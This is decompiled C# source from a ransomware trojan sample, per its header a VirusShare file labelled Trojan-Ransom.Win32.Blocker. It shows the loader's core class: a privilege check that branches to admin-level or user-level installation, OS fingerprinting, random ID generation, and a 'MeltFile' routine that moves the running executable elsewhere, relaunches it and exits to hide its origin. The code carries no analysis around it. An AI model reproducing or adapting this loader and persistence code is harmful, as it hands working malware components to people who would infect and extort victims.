// Decompiled with JetBrains decompiler
// Type: Loader.Core
// Assembly: Loader, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 35C68E31-B6CA-49D5-99F7-6D8C40001C21
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.jfzg-5a89ee9d281b9ea7b1c0a19ae23e4a66d00a3b2d0a76c3140f25bc073efe7020.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Windows.Forms;

namespace Loader
{
  internal class Core
  {
    public Core()
    {
      string str = Core.returnUserLevel(Core.codeType.Short);
      if (str == "Admin")
      {
        if (Install.isInstalledAdmin)
          return;
        Install.installAdmin();
      }
      else
      {
        if (!(str != "admin") || Install.isInstalled)
          return;
        Install.install();
      }
    }

    public static string getOS()
    {
      string str = Environment.OSVersion.Version.ToString();
      if (str.StartsWith("6.1"))
        return "WIN7";
      if (str.StartsWith("6"))
        return "VIS";
      if (str.StartsWith("5.1"))
        return "XP";
      if (str.StartsWith("5"))
        return "2000";
      if (str.StartsWith("4.9"))
        return "ME";
      return str.StartsWith("4.1") ? "98" : "UNKN";
    }

    public static string randID(int ammount)
    {
      string str1 = "ABCDEFGHIJKLMNOPQRSTUV0123456789";
      string str2 = "";
      Random random = new Random();
      for (int index = 0; index < ammount; ++index)
        str2 += str1[random.Next(str1.Length)].ToString();
      return str2;
    }

    public static string returnUserLevel(Core.codeType Type)
    {
      WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
      if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
        return Type == Core.codeType.Full ? "Administrator" : "Admin";
      if (windowsPrincipal.IsInRole(WindowsBuiltInRole.User))
        return "User";
      return windowsPrincipal.IsInRole(WindowsBuiltInRole.Guest) ? "Guest" : "Unknown";
    }

    [DllImport("Kernel32.dll", EntryPoint = "GetModuleFileNameA")]
    private static extern int GetModuleFileName(int hModule, string lpFileName, int nSize);

    [DllImport("Kernel32.dll")]
    private static extern void ExitProcess(int uExitCode);

    [DllImport("Kernel32.dll", EntryPoint = "MoveFileExA")]
    public static extern int MoveFileEx(
      string lpExistingFileName,
      string lpNewFileName,
      int dwFlags);

    public static void MeltFile(string Path)
    {
      Core.MoveFileEx(Core.Left(Application.ExecutablePath, Core.GetModuleFileName(0, Application.ExecutablePath, 256)), Path, 8);
      Process.Start(Path);
      Core.ExitProcess(0);
    }

    public static string Left(string text, int length)
    {
      if (length < 0)
        throw new ArgumentOutOfRangeException(nameof (length), (object) length, "length must be > 0");
      if (length == 0 || text.Length == 0)
        return "";
      return text.Length <= length ? text : text.Substring(0, length);
    }

    public enum codeType
    {
      Short,
      Full,
    }
  }
}
